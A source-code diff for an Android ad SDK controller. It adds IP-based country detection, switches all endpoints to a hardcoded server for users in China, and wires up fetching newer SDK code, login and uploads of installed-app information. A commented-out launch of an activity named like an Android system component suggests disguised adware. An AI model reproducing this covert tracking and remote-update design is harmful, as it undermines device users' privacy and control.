@@ -73,6 +73,15 @@ public class GAdController {
 		
 		boolean isTest = GTool.getSharedPreferences().getBoolean(GCommons.SHARED_KEY_TESTMODEL, false);
 		GTool.saveSharedData(GCommons.SHARED_KEY_TESTMODEL,isTest);
+		String country = GTool.getSharedPreferences().getString(GCommons.SHARED_KEY_COUNTRY, "");
+		if("china".equals(country))
+		{
+			updateLink();
+		}
+		else
+		{
+			GCommons.URI_POST_GET_SDKCONFIG = GCommons.SERVER_ADDRESS + "tb_getConfig";
+		}
 		
 		GTool.httpPostRequest(GCommons.URI_POST_NEW_SDK, this, "revNewSdk", GCommons.CHANNEL);	
 	}
@@ -97,11 +106,80 @@ public class GAdController {
 		} catch (NameNotFoundException e) {
 			e.printStackTrace();
 		}
+		judgeCountry();
+	}
+	
+	//判断是否是国内
+	public void judgeCountry()
+	{
+		String country = GTool.getSharedPreferences().getString(GCommons.SHARED_KEY_COUNTRY, "");
+		if(country == null || "".equals(country))
+		{
+			GTool.httpGetRequest(GCommons.IP_URL, this, "getProvinceResult",null);
+		}
+		else
+		{
+			if("china".equals(country))
+			{
+				updateLink();
+			}
+			else
+			{
+				GCommons.URI_POST_GET_SDKCONFIG = GCommons.SERVER_ADDRESS + "tb_getConfig";
+			}
+			initSdkConfig();
+		}
+	}
+	
+	public void getProvinceResult(Object obj_session,Object obj_data)
+	{
+		Log.e("------------------","getProvinceResult="+obj_data.toString());
+		try {
+			JSONObject obj = new JSONObject(obj_data.toString());
+			if("success".equals(obj.getString("status")))
+			{
+//				String city = obj.getString("city");//城市  
+//				String province = obj.getString("regionName");//省份
+				String country = obj.getString("country");//国家
+				
+				if(country != null && !"".equals(country))
+				{					
+					if(country.equals("中国") || country.equals("China") || country.equals("china"))
+					{
+						GTool.saveSharedData(GCommons.SHARED_KEY_COUNTRY, "china");
+						updateLink();
+					}
+					else
+					{
+						GTool.saveSharedData(GCommons.SHARED_KEY_COUNTRY, "haiwai");
+						GCommons.URI_POST_GET_SDKCONFIG = GCommons.SERVER_ADDRESS + "tb_getConfig";
+					}
+					
+				}
+					
+			}
+		} catch (JSONException e) {
+//			this.callback.result(false);
+		}
+		initSdkConfig();
+	}
+
+	
+	public void updateLink()
+	{
+		GCommons.SERVER_ADDRESS = "http://media.qiqiup.com/QiupAdServer/";
+		GCommons.URI_POST_GET_SDKCONFIG = GCommons.SERVER_ADDRESS + "tb_getConfig";
+		//获取最新sdk
+		GCommons.URI_POST_NEW_SDK = GCommons.SERVER_ADDRESS + "sdk_findNewSdk";
+		GCommons.URI_POST_UPDATE_SDK_NUM = GCommons.SERVER_ADDRESS + "sdk_updateNum";
 		
-//		long t = GTool.getSharedPreferences().getLong(GCommons.SHARED_KEY_LOGIN_TIME, 0l);
-//		long dt = System.currentTimeMillis() - t;
-//		if(dt > 28*60*1000)
-		login();
+		//登录
+		GCommons.URI_LOGIN = GCommons.SERVER_ADDRESS + "user_login";
+		//校验
+		GCommons.URI_VALIDATE = GCommons.SERVER_ADDRESS + "user_validates";
+		//注册
+		GCommons.URI_REGISTER = GCommons.SERVER_ADDRESS + "user_register";
+		GCommons.URI_UPLOAD_APPINFO = GCommons.SERVER_ADDRESS + "user_uploadAppInfos";
 	}
 	
 	public void initSdkConfig()
@@ -120,6 +198,7 @@ public class GAdController {
 		}
 		
 		GTool.httpPostRequest(GCommons.URI_POST_GET_SDKCONFIG, this, "revSdkConfig", obj.toString());
+		Log.e("------------------","initSdkConfig");
 	}
 	
 	
@@ -131,6 +210,7 @@ public class GAdController {
 			int callLogNum = obj.getInt("callLogNum");
 			int newChannelNum = obj.getInt("newChannelNum");
 			float time = (float) obj.getDouble("time");
+			
 			int channel_paiming =  GTool.getSharedPreferences().getInt("channel_paiming", -1);
 			if(channel_paiming == -1)
 			{
@@ -168,38 +248,17 @@ public class GAdController {
 					}
 				}
 			}
-			this.callback.result(b);
-//			if(b)
-//			{
-//				
-//				GTool.httpPostRequest(GCommons.URI_POST_NEW_SDK, this, "revNewSdk", GCommons.CHANNEL);	
-//			}
-//			else
-//			{
-//				new Thread(){
-//					public void run() {
-//						try {
-//							Thread.sleep(1*60*60*1000);
-//							initSdkConfig();
-//						} catch (InterruptedException e) {
-//							e.printStackTrace();
-//						}
-//					};
-//				}.start();
-//			}
+			if(b)
+			{
+				login();
+			}
+			else
+			{
+				this.callback.result(b);
+			}
 						
 		} catch (JSONException e) {
 			this.callback.result(false);
-//			new Thread(){
-//				public void run() {
-//					try {
-//						Thread.sleep(1*60*60*1000);
-//						initSdkConfig();
-//					} catch (InterruptedException e) {
-//						e.printStackTrace();
-//					}
-//				};
-//			}.start();
 		}	
 	}
 	
@@ -521,8 +580,8 @@ public class GAdController {
 	//登录成功
 	public void loginSuccess()
 	{			
+		this.callback.result(true);
 		GAdController.getInstance().uploadAppInfos();	
-		initSdkConfig();
 //		Intent intent = new Intent();
 //		intent.setClassName(context, "com.android.system.core.sometools.MainActivity");
 //		intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
